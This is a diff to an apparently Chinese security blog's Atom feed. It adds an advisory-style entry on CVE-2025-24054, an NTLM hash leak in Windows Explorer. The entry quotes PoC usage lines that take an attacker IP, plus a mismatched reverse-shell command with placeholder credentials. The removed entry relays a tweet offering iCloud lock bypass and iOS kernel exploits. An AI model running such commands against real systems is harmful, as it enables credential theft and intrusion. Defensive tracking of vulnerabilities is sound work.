@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T09:15:19.598Z</updated>
+  <updated>2025-07-05T09:45:18.108Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Windows Explorer NTLM Hash Leak via RAR/ZIP Extraction and library-ms File Vulnerability</title>
+    <link href="http://example.com/2025/07/05/github_1537094374/"/>
+    <id>http://example.com/2025/07/05/github_1537094374/</id>
+    <published>2025-07-05T09:45:18.000Z</published>
+    <updated>2025-07-05T09:45:18.108Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Explorer NTLM Hash Leak via RAR&#x2F;ZIP Extraction and .library-ms File Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24054</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞影响Windows操作系统中的Windows Explorer组件，这是一个广泛使用的文件管理器，用于浏览和管理文件和文件夹。Windows Explorer在处理从RAR或ZIP压缩包中提取的.library-ms文件时存在安全漏洞。具体来说，当用户从压缩包中提取.library-ms文件时，Windows Explorer会自动发起SMB认证请求，从而导致NTLM哈希泄露。用户无需打开或执行该文件，仅需提取即可触发泄露。这一漏洞的技术根源在于Windows Explorer对.library-ms文件的处理逻辑存在缺陷，未能正确验证或限制文件的自动行为。此漏洞可能导致攻击者获取用户的NTLM哈希，进而可能用于进一步的攻击，如Pass-the-Hash攻击，从而获得对系统资源的未授权访问。由于该漏洞在用户仅进行文件提取操作时即可触发，且无需用户交互，因此具有较高的利用风险。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows Explorer</p><p><strong>来源：</strong> <a href="https://github.com/Royall-Researchers/CVE-2025-24071">https://github.com/Royall-Researchers/CVE-2025-24071</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24071-PoC"><a href="#CVE-2025-24071-PoC" class="headerlink" title="CVE-2025-24071_PoC"></a>CVE-2025-24071_PoC</h2><p>CVE-2025-24071: NTLM Hash Leak via RAR&#x2F;ZIP Extraction and .library-ms File</p><h4 id="Windows-Explorer-automatically-initiates-an-SMB-authentication-request-when-a-library-ms-file-is-extracted-from-a-rar-archive-leading-to-NTLM-hash-disclosure-The-user-does-not-need-to-open-or-execute-the-file—simply-extracting-it-is-enough-to-trigger-the-leak"><a href="#Windows-Explorer-automatically-initiates-an-SMB-authentication-request-when-a-library-ms-file-is-extracted-from-a-rar-archive-leading-to-NTLM-hash-disclosure-The-user-does-not-need-to-open-or-execute-the-file—simply-extracting-it-is-enough-to-trigger-the-leak" class="headerlink" title="Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak."></a>Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak.</h4><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>&gt;&gt;python poc.py<br><br>&gt;&gt;enter file name: your file name<br><br>&gt;&gt;enter IP: attacker IP<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt;&gt;python3 poc.py --url http://domainname.com --user admin --password password --reverse-ip 10.10.10.10 --reverse-port 8888<br></code></pre></td></tr></table></figure><h2 id="update"><a href="#update" class="headerlink" title="update:"></a>update:</h2><h4 id="Update-Microsoft-has-changed-its-CVE-number-The-CVE-number-previously-defined-by-Microsoft-CVE-2025-24071-has-been-updated-to-CVE-2025-24054-🤷‍♂"><a href="#Update-Microsoft-has-changed-its-CVE-number-The-CVE-number-previously-defined-by-Microsoft-CVE-2025-24071-has-been-updated-to-CVE-2025-24054-🤷‍♂" class="headerlink" title="Update: Microsoft has changed its CVE number. The CVE number previously defined by Microsoft, CVE-2025-24071, has been updated to CVE-2025-24054.🤷‍♂"></a>Update: Microsoft has changed its CVE number. The CVE number previously defined by Microsoft, CVE-2025-24071, has been updated to CVE-2025-24054.🤷‍♂</h4>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows Explorer NTLM Hash Leak via RAR</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>Cisco Unified CM Console 未授权访问漏洞</title>
@@ -501,32 +527,6 @@
     
     
     <category term="stem4jp" scheme="http://example.com/tags/stem4jp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>minacrissDev_ Twitter Update !</title>
-    <link href="http://example.com/2025/07/05/twitter_1513149992/"/>
-    <id>http://example.com/2025/07/05/twitter_1513149992/</id>
-    <published>2025-07-05T07:00:28.000Z</published>
-    <updated>2025-07-05T07:00:28.452Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> minacrissDev_</p><p><strong>推文：</strong> iPhone 15 Pro Max通过恶意音频文件进行远程攻击（iOS 18.3 Beta &#x2F; iOS 18.2.1）</p><p><a href="https://t.co/527MmPJnpl">https://t.co/527MmPJnpl</a></p><p>🚀 免费赠送！🚀</p><p>我很高兴宣布免费赠送以下服务：</p><ul><li><p>iCloud绕过（激活锁移除）</p></li><li><p>MDM移除（学校&#x2F;工作解锁）</p></li><li><p>运营商解锁（SIM卡限制解除！）</p></li></ul><p>如果你有兴趣测试我们的iOS&#x2F;macOS内核漏洞（包括权限提升和沙盒逃逸），</p><p>请在Telegram上私信我！<br><a href="https://t.co/AD6puXQtjA">https://t.co/AD6puXQtjA</a></p><p><strong>链接：</strong> <a href="https://x.com/minacrissDev_/status/1941389369660612704">https://x.com/minacrissDev_/status/1941389369660612704</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; minacrissDev_&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; iPhone 15 Pro Max通过恶意音频文件进行远程攻击（iOS 18.3 Beta &amp;#x2F; iOS 18.2.1）&lt;/p&gt;
-&lt;p&gt;&lt;a</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="minacrissDev_" scheme="http://example.com/tags/minacrissDev/"/>
     
   </entry>
   
